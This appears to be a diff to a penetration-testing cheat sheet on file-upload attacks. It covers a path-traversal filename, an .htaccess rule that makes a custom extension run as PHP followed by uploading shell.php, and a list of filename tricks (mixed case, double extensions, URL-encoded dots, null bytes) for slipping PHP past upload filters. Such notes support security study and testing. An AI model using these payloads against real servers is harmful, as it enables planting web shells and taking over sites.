@@ -28,3 +28,12 @@ Content-Disposition: form-data; name="image"; filename="../../example.php"
 ##### Overriding the server configuration
  - Websevers can look at local directory configuration to override global config, for apache `.htaccess`. `AddType application/x-httpd-php .l33t`. Maps extension `.l33t` to `application/x-httpd-php` module.
  - Try to upload `.htacess` and then `shell.php`
+
+##### Obfuscating file extensions
+ - exploit.pHp
+ - exploit.php.jpg
+ - exploit%2Ephp
+ - exploit.asp;.jpg
+ - exploit.asp%00.jpg
+ - exploit.p.phphp
+ - For detailed explaination https://portswigger.net/web-security/file-upload 
